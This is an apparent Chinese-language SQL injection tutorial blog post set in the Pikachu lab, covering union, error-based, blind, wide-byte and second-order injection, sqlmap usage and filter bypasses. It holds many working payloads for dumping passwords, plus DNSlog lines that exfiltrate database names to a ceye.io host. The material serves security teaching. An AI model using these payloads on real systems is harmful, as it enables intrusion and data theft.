---
layout: post
title: SQL注入全面指南
date: 2026-04-21
tags: [SQL注入, 网络安全, Web安全]
---

# SQL注入全面指南

> SQL注入是Web安全中最常见、危害最大的漏洞类型之一。本文从原理到实战，系统梳理SQL注入的各类攻击手法与防御绕过，适合安全入门学习参考。

---

## 一、网站原理

![网站原理](/assets/images/05/image.png)

---

## 二、SQL注入漏洞原理

**核心一句话：** 服务端没有对用户提交的数据进行过滤，黑客控制了你拼接的语句。

当用户输入被直接拼接到SQL查询字符串中，攻击者就可以通过精心构造的输入来改变原SQL语句的逻辑，从而执行非预期的数据库操作。

---

## 三、代码层面的理解

![代码层面](/assets/images/05/image-1.png)

后端通过 `$_GET` 等超全局变量接收用户输入，并直接拼接到SQL语句中：

```php
$name = $_GET['name'];
$query = "select id,email from member where username='$name'";
```

### 经典 Payload

```sql
xx' or 1=1#
```

![payload示意](/assets/images/05/image-2.png)

将 payload 提交后，实际执行的SQL语句变为：

```sql
$query = "select id,email from member where username='xx' or 1=1#'";
```

### 代码解析

| 符号 | 作用 |
|------|------|
| `#` | 注释符，注释掉后面所有代码，使其不生效 |
| `xx'` 中的单引号 | 与 `username='$name'` 中前面的单引号配对闭合 |
| `or 1=1` | 恒真条件，使查询返回所有数据 |

> **💡 为什么 `#` 在这里能注释？** `#` 在PHP字符串中没有注释功能，但当这个字符串被提交到数据库执行时，`#` 就成了SQL的注释符，可以注释掉后面多出的单引号。不用担心会注释掉外层的双引号——那只是PHP的字符串定界符，不会被数据库解析。

![效果](/assets/images/05/image-3.png)

---

## 四、注入位置

前端页面上**所有提交数据的地方**都可能是注入点：登录、注册、留言板、评论区、分页……只要数据被提交给后台并与数据库交互，就可能存在注入。

不管数据在HTTP请求数据包的什么位置（POST或GET），只要后台取出该数据与数据库交互，都可能存在注入点。

![注入位置](/assets/images/05/image-4.png)

---

## 五、URL编码

URL编码是一种将特殊字符转换为 `%` 后接十六进制格式的技术。

**为什么需要？** 服务端通过键值对取值，如果值中间包含特殊符号，就会破坏键值对结构，导致后端无法正常解析。这时需要将特殊符号进行URL编码。

```
键值对示例：
username = xiaoming
password = 123
age = 18
```

---

## 六、常用注释符号与测试语句

SQL的注释符号是注入语句的关键点：

```sql
#          -- （有一个空格）
--+        --%20
```

### GET 请求下

![GET注释1](/assets/images/05/image-6.png) ![GET注释2](/assets/images/05/image-7.png)

1. **`#` 和 `--`（有个空格）** 都表示注释，使其后面的语句不执行。但在GET请求中，URL中的 `#` 是浏览器锚点标记，HTTP请求中不包含 `#`，所以无法注释；而 `--` 后的空格在传输中会被忽略，同样无法注释。因此在GET注入时使用 **`--+`**，因为 `+` 会被解释为空格。
2. 也可以使用 **`--%20`**（空格的URL编码），或者将 `#` 编码为 **`%23`**。

### POST 请求下

![POST注释](/assets/images/05/image-8.png)

3. POST请求中可以直接使用 `#` 来闭合，常见场景如后台登录框注入。
4. **为什么 `--` 后必须有空格？** 因为不加空格，`--` 会和系统自动生成的单引号连接在一起，被当作一个关键词而非注释符。`#` 后面有无空格均可，这是SQL语法规定。

---

## 七、简单测试语句

### 1. 引号测试

加引号如果报错，证明存在注入点：

| 闭合方式 | 测试方法 |
|----------|----------|
| **单引号闭合**：`$query="select ... where username='vince'"` | 单引号测试→报错，双引号测试→查不到数据不报错 |
| **双引号闭合**：`$query='select ... where username="vince"'` | 双引号测试→报错，单引号测试→查不到数据不报错 |

> **⚠️ 报错 ≠ 查不到数据**
> - 报错：`You have an error in your SQL syntax...`
> - 查不到数据：`您输入的username不存在，请重新输入！`

### 2. `or 1=1`

一个条件为真即为真，效果是查询到表中所有数据。

### 3. `where id=1 and 1=1` / `and 1=2`

- `and 1=1`：两个条件为真才为真，结果与不加 `1=1` 一样
- `and 1=2`：一个条件为假即为假，查询结果为空

两者结合可判断是否存在注入点。

### 4. `union select` 联合查询

> 仅适用于关系型数据库，Redis等非关系型数据库不能使用。

---

## 八、Union 联合查询

通过前面的表联合查询另一个表：

```sql
-- payload
xx' union select username,password from users#
```

**列数必须一致：**

```sql
-- ❌ 可能报错：后面的表列数超出第一个表查询的列数
select id,email from member where username='vince' union select * from user

-- ✅ 保持列数一致
select id,email from member where username='vince' union select username,password from user
```

![Union查询](/assets/images/05/image-5.png)

---

## 九、SQL注入分类

### 9.1 数据类型分类

- 数字型
- 字符型
- 搜索型
- XX型（括号型）
- JSON型

#### 9.1.1 数字型注入

数字型注入**不需要考虑引号闭合问题**，因为SQL语句中的数字不需要用引号括起来。

![数字型注入](/assets/images/05/image-9.png)

```sql
-- payload
1 or 1=1
```

> **💡 Tips：** 判断是否为数字型注入，不能仅凭前端页面显示的是数字来判断。后台可能将前端传递的数字用引号括起来当作字符串处理（伪数字型），所以要多尝试。

#### 9.1.2 字符型注入

```sql
-- payload
xxx' or 1=1#
```

![字符型注入](/assets/images/05/image-10.png)

需注意 PHPStudy 等环境的安全机制——自动为特殊字符加反斜杠 `\` 转义：

![安全机制](/assets/images/05/image-11.png)

#### 9.1.3 搜索型注入

使用模糊匹配 `%xx%`，搜索包含xx的内容：

```sql
mysql> select * from member where username like '%vince%' or 1=1;
```

```sql
-- payload
%xx%' or 1=1#
```

![搜索型注入](/assets/images/05/image-12.png)

#### 9.1.4 XX型注入

XX型是由于SQL语句拼接方式不同导致的，不仅限于括号，需要多尝试：

```sql
mysql> select * from member where username=('vince');
```

```sql
-- payload
XX') or 1=1#
```

![XX型注入](/assets/images/05/image-13.png)

#### 9.1.5 JSON 介绍

JSON是各开发语言之间传输数据的标准格式。不同语言处理数据各有标准，无法直接互相使用，因此需要第三方数据格式（如XML、JSON）作为中介。

**数据传输流程：**

![数据传输](/assets/images/05/image-14.png)

**前后端未分离项目**（前后端代码写在一起）：

![未分离](/assets/images/05/image-15.png)

**前后端分离项目**（前端只展示，后端只查询）：

![分离](/assets/images/05/image-16.png)

#### 9.1.6 JSON 注入

需在Firefox浏览器安装Hackbar插件。

**网站代码：**

```php
<?php
header('content-type:text/html;charset=utf-8');

if(isset($_POST['json'])){
    $json_str = $_POST['json'];
    $json = json_decode($json_str);
    if(!$json){
        die('JSON文档格式有误，请检查');
    }
    $username = $json->username;

    $mysqli = new mysqli();
    $mysqli->connect('localhost','root','root');
    if($mysqli->connect_errno){
        die('数据库连接失败：'.$mysqli->connect_error);
    }

    $mysqli->select_db('pikachu');
    if($mysqli->errno){
        die('打开数据库失败：'.$mysqli->error);
    }

    $mysqli->set_charset('utf-8');

    $sql = "SELECT username,password FROM users WHERE username='{$username}'";
    $result = $mysqli->query($sql);
    if(!$result){
        die('执行SQL语句失败：'.$mysqli->error);
    } else if($result->num_rows == 0){
        die('查询结果为空');
    } else {
        while($data = mysqli_fetch_assoc($result)){
            $username = $data['username'];
            $password = $data['password'];
            echo "用户名：{$username},密码：{$password}";
        }
    }

    $result->free();
    $mysqli->close();
}
?>
```

**正常查询：**

![正常查询](/assets/images/05/image-17.png)

**JSON注入：**

![JSON注入](/assets/images/05/image-18.png)

```json
{"username":"xx' or 1=1 #"}
```

---

### 9.2 SQL注入提交方式分类

GET、POST、Cookie等

#### 9.2.1 Cookie 注入

Cookie是网站存在浏览器里的一小段文本信息，用来记住和识别用户，且是**明文**的。

![Cookie](/assets/images/05/image-19.png)

在admin后加入payload：

```sql
' or 1=1#
```

但可能无回显，因为服务端代码可能没有设计该功能。此时需要用**报错注入**（后面详细讲解）：

```sql
' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#
```

![Cookie报错注入](/assets/images/05/image-20.png)

会爆出数据库版本号，然后利用信息收集知识寻找对应的POC。

#### 9.2.2 GET注入与POST注入

找到注入位置即可，前面已详细讲解。

---

### 9.3 SQL注入请求数据位置分类

请求行、请求头、请求数据、Cookie部分

![请求数据位置](/assets/images/05/image-8.png)

#### 9.3.1 Header（请求头）注入

请求头中的键值对如 `User-Agent` 包含客户端软件信息，有些企业会将其保存到数据库中，也可能存在注入点。

PHP通过 `$_SERVER['HTTP_USER_AGENT']` 获取值。

> **注意：** 此类注入一般仅存入数据，不会直接显示，因此使用报错注入。

```sql
or updatexml(1,concat(0x7e,version()),0) or'
```

每个请求头都可以尝试注入。

---

### 9.4 MySQL变量和函数

```sql
-- 查看变量
show global variables;

-- 取出版本
select @@version;

-- 取出指定变量
select @@xxxx;  -- xxxx是变量名
```

**内置函数：**

```sql
user();       -- 当前用户
version();    -- 数据库版本
database();   -- 当前库名
```

---

### 9.5 报错注入

**场景：** 无回显信息

**条件：** 后台没有屏蔽数据库报错信息，语法错误时信息会输出到前端，且可能包含库名、表名等敏感信息。

#### 9.5.1 三个常用的报错函数

**1. Updatexml()** — MYSQL对XML文档数据进行查询和修改的XPATH函数

```sql
UPDATEXML(XML_document, XPath_string, new_value);
```

| 参数 | 说明 |
|------|------|
| `XML_document` | String格式，XML文档对象名称 |
| `XPath_string` | Xpath格式的字符串，用于匹配 |
| `new_value` | String格式，替换查找到的符合条件的数据 |

**原理：** 例如数据库版本为5.5.53，`concat` 连接后得到 `~5.5.53~`。`updatexml(1,~5.5.53~,1)` 中 `~5.5.53~` 不符合xpath语法格式，因此报错并泄露信息。

**2. Extractvalue()** — MYSQL对XML文档数据进行查询的XPATH函数

```sql
EXTRACTVALUE(XML_document, XPath_string);
```

| 参数 | 说明 |
|------|------|
| `XML_document` | String格式，XML文档对象名称 |
| `XPath_string` | Xpath格式的字符串 |

```sql
-- 示例：在XML中查找a节点下的b节点
SELECT ExtractValue('<a><b>hello</b></a>', '/a/b');
```

Xpath格式语法书写错误时会报错，利用这个特性获取信息。

**3. Floor()** — MYSQL取整函数（用得较少）

**报错注入示例：**

```sql
-- 第一个和第三个参数随便写
-- concat()是连接字符串函数，0x7e是~的16进制编码（防止引号引起不必要错误）
-- 优先执行最内层括号的select(version())，先显示版本然后报错
select updatexml(1,concat(0x7e,(select version()),0x7e),1);
```

#### 9.5.2 实战测试

**1. 爆数据库版本信息**

```sql
k' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#
```

> 整句话的意思：执行updatexml函数，在数据 `1` 中匹配 `~数据库版本~` 的规则并替换为 `1`，显然匹配不到且报错。

![爆版本](/assets/images/05/image-21.png)

**2. 爆数据库当前用户**

```sql
k' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#
```

**3. 爆当前数据库**

```sql
k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#
```

**4. 爆表名**

```sql
k' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#
```

报错提示只能显示一行，使用 `limit` 逐行显示：

![爆表名](/assets/images/05/image-22.png)

```sql
k' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#
```

> 修改 `limit` 第一个数字来遍历所有表名。第一个数字表示第几行（从0开始），第二个数字表示取几行。

**5. 爆字段（列）名**

```sql
k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' and table_schema='pikachu' limit 2,1)),0)#
```

> `information_schema.columns` 表示跨库查询，我们使用的是pikachu库。

**6. 爆字段内容**

```sql
k' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#
```

> `concat` 返回连接参数产生的字符串。如有任何一个参数为NULL，则返回值为NULL。

---

### 9.6 SQL注入查询语句分类

按SQL语句类型分：`select`、`delete`、`update`、`insert`（增删改查）

#### 9.6.1 Insert 注入

前端**注册**（或提交）的信息最终被后台通过 `insert` 操作插入数据库。若后台未对注册数据做防SQL注入处理，前端的输入可直接拼接SQL到后端的insert语句中。

通过Burp抓包，在用户名后添加payload：

![Insert注入](/assets/images/05/image-23.png)

> 末尾不能加 `#`，因为后面还有其他数据需要提交，所以用 `or` 来闭合。

```sql
-- 原始insert语句
insert into member(username,pw,sex,phonenum,email,address) values('jaden',123456,1,2,3,4);

-- 注入后
insert into member(username,pw,sex,phonenum,email,address) values('jaden' or updatexml(...) or '',123456,1,2,3,4);
```

**1. 爆表名**

```sql
'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0) or'
```

**2. 爆列名**

```sql
' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 2,1)),0) or'
```

**3. 爆内容**

```sql
' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'
```

#### 9.6.2 Update 注入

与insert注入方法大体相同，区别在于 `update` 用于用户**登录端**（修改最后一次登录时间等），`insert` 用于**注册端**。

![Update注入1](/assets/images/05/image-24.png) ![Update注入2](/assets/images/05/image-25.png)

有四个数据发送到后台，需逐个测试注入点。经测试发现手机号存在注入点：

```sql
' or updatexml(0,concat(0x7e,(select database())),0) or'
```

#### 9.6.3 Delete 注入

一般应用于前后端发帖、留言、用户等删除操作。点击删除按钮时通过Burp Suite抓包，对数据包中delete相关参数进行注入。一般普通用户无权删除数据，需要管理员权限。

![Delete注入1](/assets/images/05/image-26.png) ![Delete注入2](/assets/images/05/image-27.png) ![Delete注入3](/assets/images/05/image-28.png)

在 `id=56` 后面加payload：

```sql
or updatexml(2,concat(0x7e,(database())),0)
```

由于是GET请求，需对特殊符号进行URL编码：

```sql
%20or%20updatexml(2,concat(0x7e,(database())),0)
```

---

### 9.7 宽字节注入

为防止SQL注入，可在 `php.ini` 中设置 `magic_quotes_gpc=on` 或使用转义函数（如 `addslashes`、`mysql_real_escape_string`），它们会转义单引号 `'`、双引号 `"`、反斜杠 `\` 和 NULL，方式是在前面加 `\`。

- 反斜杠 `\` 的URL编码是 `%5C`
- `XX' or 1=1#` 会被转为 `XX%5C%27...`

**GBK编码的绕过原理：** 如果是GBK编码，在单引号前加 `%df`，`\`（`%5C`）会和 `%df` 组合成一个繁体中文字符，从而"吃掉"反斜杠，保留单引号。

```sql
xxx%df%27 or 1=1%23
```

> **⚠️ 此方法仅适用于GBK编码，不能推到UTF-8**，因为UTF-8没有这样的字符组合。

![宽字节注入](/assets/images/05/图片-1.png)

---

## 十、偏移量注入

### 原理

偏移注入是一种注入姿势，可以根据一个较多字段的表对一个少字段的表进行偏移注入，一般在联合查询、页面有回显点的情况下使用。当猜到表名但无法猜到字段名时，可使用偏移注入来查询数据。

> 现在用得不多，有时候不太好用。

### 场景

1. 联合查询
2. 前面的表列数多于后面的
3. 服务端只展示其中几列
4. 知道注入的表名，但不知道列名

```sql
-- ❌ 会报错：前面有7列，后面有4列
select * from member union select * from users;
```

![列数不匹配](/assets/images/05/image-31.png)

```sql
-- 测试列数
select 1,2,3;
```

![select 1,2,3](/assets/images/05/image-29.png)

后面表比前面少3列，补上3个数字即可：

```sql
select * from member union select *,1,2,3 from users;
```

![偏移注入](/assets/images/05/image-30.png)

> 服务端可能只显示username和email列，那么union联合查询的表中对应位置也是username和3。可以调整 `*` 和数字的位置来改变对应关系，但很难保证每列都能对上，比较局限。

```sql
-- *号不在首位时要写成 表名.*
select * from member union select 1,2,3,user.* from users;
```

如果前面的表列数也未知，可以逐步添加数字测试：

```sql
select * from member union select 1,2,3,4····;  -- 不断添加，不报错时就知道列数了
```

---

## 十一、其他注入手法

### 11.1 加密注入

JS加密流程：

![加密注入](/assets/images/05/image-32.png)

加密是为了防止中间人抓包看到密码。抓包时拿到的是加密后的数据，如果直接在抓包中添加 `or 1=1#`，服务端会把整段内容解密，解密后毫无意义。

**正确方法：**
- 直接在输入框内写 `jaden or 1=1#`，让整段内容被加密后发送
- 或者抓包后找到JS加密方法（如Base64编码），将 `admin' or 1=1#` 整体加密后再发送
- 难点在于识别加密方式，需要在JS代码中分析加密逻辑

### 11.2 堆叠注入

堆叠注入允许在分号后追加多条SQL语句：

```sql
select * from users; insert into xssblind values(1,'2026',"xxx","xiaoming")
```

**与Union联合注入的区别：**

| 特性 | Union注入 | 堆叠注入 |
|------|-----------|----------|
| 语句类型 | 仅查询（SELECT） | 增删改查均可 |
| 回显 | 返回联合查询结果 | 只显示第一条SQL的信息 |

> 堆叠注入只能显示第一条SQL语句的信息，因此读数据时用union。使用堆叠注入前需知道表名、列名等数据库信息。

**使用条件有限，一旦能被使用，将对数据安全造成重大威胁。**

**数据库支持情况：**
- MySQL：部分API支持
- SQL Server：都支持
- Oracle：都不支持

![堆叠注入1](/assets/images/05/image-33.png) ![堆叠注入2](/assets/images/05/image-34.png)

### 11.3 二次注入

> 此漏洞黑盒测试基本很难发现，通常通过代码审计发现。

**原理：** 攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入SQL查询语句所导致的注入。

**流程：**
1. 第一次插入数据时，使用 `addslashes` 或 `get_magic_quotes_gpc` 对特殊字符进行转义
2. 数据写入数据库时保留了原始数据（如单引号），数据库中存的是"脏数据"
3. 开发者认为数据库中的数据是可信的
4. 下一次查询时直接从数据库取出脏数据，未进一步检验，形成二次注入

![二次注入](/assets/images/05/image-35.png)

**示例：**

![二次注入示例1](/assets/images/05/image-36.png) ![二次注入示例2](/assets/images/05/image-37.png)

1. 注册用户：`admin'#`，密码：`123`
2. 脏数据 `admin'#` 被写入数据库，数据库默认该数据是安全的
3. 更新密码时，将 `123` 改为 `666`，实际执行：

```sql
update users set password='666' where username='admin'#' and password='123'
```

`#` 后面全部被注释，直接完成了对 `admin` 用户密码的更改！然后就可以用 `666` 登录 `admin` 账户（通常为管理员）。

### 11.4 中转注入

把参数中转一下，再发送到指定网址。可以对请求携带的数据进行二次加工。

简单来说就是：抓包 → 修改数据 → 重新提交。

### 11.5 伪静态注入

伪静态网站是将动态网站伪装成静态网站，在URL界面仍可进行数据交互。

![伪静态](/assets/images/05/image-38.png)

**静态显示：** `http://192.168.61.149/thread-1-1-1.html`

**Nginx重写规则：**

```nginx
rewrite ^([^\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\.html$ $1/forum.php?mod=viewthread&tid=$2&extra=page%3D$4&page=$3 last;
```

**实际动态访问：** `http://192.168.61.149/forum.php?mod=viewthread&tid=1&extra=page%3D1`

后台通过正则匹配提取URL中的参数，构建新的URL进行跳转，完成数据交互。我们只需在伪静态的参数部分（`-1-1-1`）加入payload即可。

---

## 十二、盲注与回显

当注入语句被带入数据库查询但什么都没有返回时（应用程序返回"通用"页面或重定向到首页），之前的方法就无法使用了。

| 状态 | 说明 |
|------|------|
| **有回显** | 页面正常显示查询结果 |
| **无回显** | 页面无信息显示，需采用盲注手段 |

![盲注与回显](/assets/images/05/image-41.png)

---

## 十三、盲注

盲注即在SQL注入过程中，SQL语句执行后选择的数据不能回显到前端，需要使用特殊方法进行判断或尝试。

**两大类型：** 基于布尔型SQL盲注、基于时间型SQL盲注

### 13.1 布尔型盲注

通过比较运算判断真假（真1假0），逐字符猜解数据。

**常用函数：**

```sql
database()                          -- 查看当前数据库名
length()                            -- 显示字符串长度，如 length(database()) 显示7
substr(字符串, 起始位置, 截取长度)    -- 截取子串，如 substr('xiaoming',2,1) → 'i'
ascii()                             -- 字符转ASCII码，如 ascii('p') → 112
```

**判断语句：**

```sql
-- 判断数据库首字母的ASCII码是否大于某值
select ascii(substr(database(),1,1)) > xx;
```

> 结果为1或0，不是给你看的，是告诉程序该语句真假，并不会报错。

**Payload：**

```sql
-- 判断首字母ASCII码是否为112（即'p'）
vince' and ascii(substr(database(),1,1))=112#

-- 实际执行
select * from users where username='Vince' and ascii(substr(database(),1,1))=112#'
```

![布尔盲注1](/assets/images/05/image-42.png) ![布尔盲注2](/assets/images/05/image-43.png)

> 真则显示vince用户存在，假则查询不到。

```sql
-- 判断数据库名长度是否等于7
vince' and length(database())=7#
```

没有报错说明存在注入点。布尔型盲注基本都通过ASCII码来测试，通常配合自动化工具使用。

### 13.2 时间型盲注

无论输入什么都无回显，或者总是显示相同页面，可能是时间型盲注。

![时间盲注](/assets/images/05/image-44.png)

**常用函数：**

```sql
sleep(n)                  -- 让数据库停止n秒后继续执行
if(a>b,"aa","bb")         -- 条件判断：a>b为真返回aa，否则返回bb
benchmark(count,expr)     -- 将expr执行count次，达到延迟效果
```

**第一步：判断注入点**

```sql
vince' and sleep(5)#
```

- 若用户名正确，页面加载约5秒（左上角圈圈转5秒）
- 若用户名不正确，页面立刻刷新
- 说明存在注入点

**第二步：逐字符猜解**

```sql
vince' and if(substr(database(),1,1)='p',sleep(10),null)#
```

如果数据库首字母是 `p`，则等待10秒刷新；若不是，立刻刷新。逐个字母猜测。

**当 `sleep()` 被禁用时，使用 `benchmark()` 替代：**

```sql
-- benchmark将MD5(1)执行10000000次以达到延迟效果
vince' and if(ascii(...)>100, benchmark(10000000,md5(1)), null)#
```

### 13.3 DNSlog 注入

DNSlog注入又称DNS带外查询。DNS在域名解析时会在DNS服务器上留下记录，可以在DNS服务器上查询解析记录来获取数据。

![DNSlog](/assets/images/05/image-45.png)

当盲注也被限制时，可以尝试此方法。

**关键函数：**

```sql
load_file("C:\\1.txt")                    -- 读取本地文件内容
load_file("\\\\www.baidu.com")             -- 向该网站发送请求
load_file("\\\\database().www.text.com")    -- 若存在注入点，会向pikachu.www.test.com发送网络请求
```

**原理：** 执行 `load_file(concat('\\\\',database(),'.test.com'))` 会向 `pikachu.test.com` 发送DNS查询请求，如果你有一个 `ns1.test.com` 的DNS服务器且开启了日志记录，该查询就会被记录下来。

**DNSlog平台（无需自建）：**

- [http://ceye.io/](http://ceye.io/) — 知道创宇提供
- [http://www.dnslog.cn/](http://www.dnslog.cn/)
- [http://admin.dnslog.link](http://admin.dnslog.link) — 可能已不可用

![DNSlog平台](/assets/images/05/image-46.png)

**获取库名：**

```sql
and (select load_file(concat('//',(select database()),'.9fqiop.ceye.io/abc')))

-- 或
and (select load_file(concat('\\\\',(select database()),'.9fqiop.ceye.io\\abc')))
```

**获取表名：**

```sql
-- 第一张表
and (select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.9fqiop.ceye.io\\abc')))

-- 第二张表
and (select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 1,1),'.9fqiop.ceye.io\\abc')))

-- 第三张表
and (select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 2,1),'.9fqiop.ceye.io\\abc')))
```

修改 `limit` 后面的数字即可遍历所有表名。

---

## 十四、SQLMap

SQLMap是一个开源的渗透工具，可自动化检测和利用SQL注入缺陷以及接管数据库服务器。它拥有强大的检测引擎、多种渗透测试特性和广泛的开关选项，支持从数据库指纹识别、数据获取到底层文件系统访问和操作系统命令执行。

![SQLMap](/assets/images/05/image-47.png)

### 14.1 参数介绍与示例

#### 14.1.1 `-r` — 万能参数

主要针对POST注入，但任何请求方法都适用，是**最常用**的参数。

将数据包内容保存到文件（如 `c:\2.txt`），然后运行：

```bash
sqlmap.py -r c:\2.txt
```

![sqlmap -r](/assets/images/05/image-48.png)

**辅助参数：**

| 参数 | 说明 |
|------|------|
| `--level` | 测试等级（1-5，默认1）。≥2检查Cookie，≥3检查User-Agent和Referer |
| `--risk` | 测试风险（0-3，默认1）。2增加基于事件的测试，3增加OR语句测试 |

![结果](/assets/images/05/image-49.png)

#### 14.1.2 `-u` — GET请求注入

后面接完整URL，仅针对GET请求方法。

#### 14.1.3 `-v` — 详细信息级别

VERBOSE信息级别：0-6（默认1）

| 级别 | 显示内容 |
|------|----------|
| 0 | 仅Python错误及严重信息 |
| 1 | 基本信息+警告（默认） |
| 2 | Debug信息 |
| 3 | 注入的payload |
| 4 | HTTP请求 |
| 5 | HTTP响应头 |
| 6 | HTTP响应页面 |

> 推荐级别3查看payload，级别5查看详细HTTP响应。

![sqlmap -v](/assets/images/05/image-52.png)

#### 14.1.4 `--level`

一般使用级别3，会检测Cookie、User-Agent、Referer等请求头的注入点。

![sqlmap level](/assets/images/05/image-50.png)

#### 14.1.5 `--risk`

![sqlmap risk](/assets/images/05/image-51.png)

#### 14.1.6 `-p` — 指定参数注入

当URL有多个参数时，指定只对某个参数进行注入。

```bash
sqlmap.py -u "http://192.168.0.15/sql.php?id=1&name=test" -p id
```

![sqlmap -p](/assets/images/05/image-53.png)

#### 14.1.7 `--threads` — 线程数

默认值10，最大也是10。若想跑得更快，可调整此值：

```bash
--threads 20
```

也可在 `C:\sqlmap-master\lib\core\settings.py` 中修改默认值。

![sqlmap threads](/assets/images/05/image-54.png)

#### 14.1.8 `--batch` / `--smart`

智能判断测试，自行寻找注入点，**耗时较长**。

会将所有数据库全部遍历，并将每步信息保存到 `C:\Users\Administrator\AppData\Local\sqlmap\output`。

#### 14.1.9 `--mobile` — 模拟手机环境

有的网站只允许手机访问，此参数将请求伪装为手机发送（修改User-Agent）。

![sqlmap mobile](/assets/images/05/image-55.png)

#### 14.1.10 `-m` — 批量注入

将多个注入URL写入txt文件，批量检测：

```bash
sqlmap.py -m c:\2.txt
```

#### 14.1.11 注入获取数据相关参数

| 参数 | 功能 |
|------|------|
| `--dbs` | 获取所有数据库 |
| `--current-user` | 当前数据库用户 |
| `--current-db` | 当前连接的数据库名 |
| `--is-dba` | 判断当前用户是否为管理员 |
| `--users` | 列出所有数据库用户 |
| `--tables -D 库名` | 获取指定库的表名 |
| `--columns -T 表名 -D 库名` | 获取指定表的字段名 |
| `-T 表名 -C 字段1,字段2 --dump` | 获取指定字段的数据 |
| `--file-read /etc/passwd` | 读取目标主机文件 |

![获取表名](/assets/images/05/image-56.png)

![获取字段名](/assets/images/05/image-58.png)

![获取数据](/assets/images/05/image-59.png)

---

## 十五、前后端代码绕过

### 前端代码绕过

![前端绕过](/assets/images/05/image-60.png)

### 后端代码绕过

```php
<?php
$uname = $_GET('username');

// 情况一：判断关键字
if ('select' in $uname){
    echo '不要搞事情';
}

// 情况二：替换关键字
// 将 select * from users 中的 select 替换为空字符串
echo str_replace("select","","select * from users");

// 情况三：将用户提交的id数据转换为整型
$id = $_POST('id');
$id_int = intval($id);
select * from users where id=$id_int;

// 情况四：魔术符号，自动在引号前加\转义
magic_quotes_gpc=on;
// 或者使用了 addslashes($id)
?>
```

| 防御方式 | 绕过方法 |
|----------|----------|
| **情况一：关键字判断** | 大小写绕过：`SELECT * FROM USERS` |
| **情况二：关键字替换** | 双写绕过：`selselectect` → 替换掉中间的select后还剩一个select |
| **情况三：整型转换** | 强防御，很难绕过。但只在数据为纯数字时生效，非数字类型不会被intval()处理，可尝试其他注入手法 |
| **情况四：魔术引号转义** | 参见宽字节注入、二次注入。数字型注入无单引号，可绕过：`id=1 and select * from users` |

---

> **⚠️ 免责声明：** 本文内容仅供安全学习与研究使用，请勿用于非法用途。未经授权对他人系统进行SQL注入测试属于违法行为。
